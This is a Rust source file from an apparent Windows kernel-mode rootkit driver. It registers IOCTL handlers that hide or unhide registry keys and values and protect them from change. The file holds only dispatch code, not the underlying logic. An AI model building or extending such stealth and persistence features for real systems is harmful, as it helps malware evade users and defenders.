#![cfg(not(feature = "mapper"))]

use {
    crate::{
        handle_registry,
        registry::{Registry, utils::KeyListType}
    },
    shared::structs::TargetRegistry,
    crate::utils::ioctls::IoctlHandler, 
    alloc::boxed::Box, 
    hashbrown::HashMap, 
    shared::ioctls::{
        IOCTL_HIDE_UNHIDE_KEY, IOCTL_HIDE_UNHIDE_VALUE, IOCTL_REGISTRY_PROTECTION_KEY, 
        IOCTL_REGISTRY_PROTECTION_VALUE
    }, 
    wdk_sys::{IO_STACK_LOCATION, IRP}
};

pub fn get_registry_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Adding protection for registry key values.
    ioctls.insert(IOCTL_REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_REGISTRY_PROTECTION_VALUE");
        let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Protect) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);
    
    // Added protection for registry keys.
    ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_REGISTRY_PROTECTION_KEY");
        let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Protect) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // ?
    ioctls.insert(IOCTL_HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_UNHIDE_KEY");
        let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Hide) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // ?
    ioctls.insert(IOCTL_HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_UNHIDE_VALUE");
        let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Hide) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);
}